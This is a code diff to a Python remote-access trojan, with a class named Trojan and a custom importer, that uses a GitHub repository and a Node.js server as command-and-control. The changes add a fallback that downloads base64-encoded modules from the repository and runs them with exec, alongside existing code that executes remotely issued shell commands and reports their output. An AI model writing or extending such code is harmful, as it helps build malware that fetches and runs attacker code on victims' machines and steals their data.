@@ -19,7 +19,8 @@ def github_connect():
 
 def get_file_contents(dirname, module_name, repo):
     try:
-        return repo.file_contents(f'{dirname}/{module_name}').content
+        file = repo.file_contents(f'{dirname}/{module_name}')
+        return file.content
     except github3.exceptions.NotFoundError:
         print(f"[*] File '{dirname}/{module_name}' not found in repository.")
         return None
@@ -40,7 +41,7 @@ class Trojan:
     def get_nodejs_config(self):
         try:
             response = requests.get(f"{self.node_server_url}/config")
-            response.raise_for_status()  # Ensure we catch HTTP errors
+            response.raise_for_status()
             return response.json()
         except requests.exceptions.RequestException as e:
             print(f"[*] Failed to get config from Node.js server: {e}")
@@ -68,17 +69,32 @@ class Trojan:
             result = e.output.decode('utf-8')
         self.send_command_result(command, result)
 
-    def module_runner(self, module):
-        if module in sys.modules:
+    def module_runner(self, module_name):
+        if module_name in sys.modules:
             try:
-                result = sys.modules[module].run()
+                result = sys.modules[module_name].run()
                 self.store_module_result(result)
             except AttributeError:
-                print(f"[*] Module '{module}' does not have a 'run' method.")
+                print(f"[*] Module '{module_name}' does not have a 'run' method.")
             except Exception as e:
-                print(f"[*] Error running module '{module}': {e}")
+                print(f"[*] Error running module '{module_name}': {e}")
         else:
-            print(f"[*] Module '{module}' not loaded.")
+            print(f"[*] Module '{module_name}' not loaded. Trying to load it now...")
+            # Attempt to load the module
+            importlib.invalidate_caches()
+            try:
+                module_code = get_file_contents('modules', f'{module_name}.py', self.repo)
+                if module_code:
+                    exec(base64.b64decode(module_code), globals())
+                    if module_name in sys.modules:
+                        result = sys.modules[module_name].run()
+                        self.store_module_result(result)
+                    else:
+                        print(f"[*] Module '{module_name}' still not found after loading.")
+                else:
+                    print(f"[*] Failed to retrieve module code for '{module_name}'.")
+            except Exception as e:
+                print(f"[*] Error loading module '{module_name}': {e}")
 
     def store_module_result(self, data):
         message = datetime.now().isoformat()
@@ -115,8 +131,8 @@ class Trojan:
             for task in github_config.get('modules', []):
                 module_name = task['module']
                 if module_name not in sys.modules:
-                    print(f"[*] Module '{module_name}' not found. Skipping...")
-                    continue
+                    print(f"[*] Module '{module_name}' not found in sys.modules. Loading it now...")
+                    self.module_runner(module_name)
                 thread = threading.Thread(target=self.module_runner, args=(module_name,))
                 thread.start()
                 time.sleep(random.randint(1, 10))
@@ -125,11 +141,11 @@ class Trojan:
 
 class GitImporter:
     def __init__(self):
+        self.repo = github_connect()
         self.current_module_code = ""
 
     def find_spec(self, fullname, path, target=None):
         print(f"[*] Attempting to retrieve {fullname}")
-        self.repo = github_connect()
         try:
             new_library = get_file_contents('modules', f'{fullname}.py', self.repo)
             if new_library:
@@ -137,7 +153,7 @@ class GitImporter:
                 return importlib.util.spec_from_loader(fullname, loader=self)
         except github3.exceptions.NotFoundError:
             print(f"[*] Module {fullname} not found in repository.")
-            return None
+        return None
 
     def create_module(self, spec):
         return None
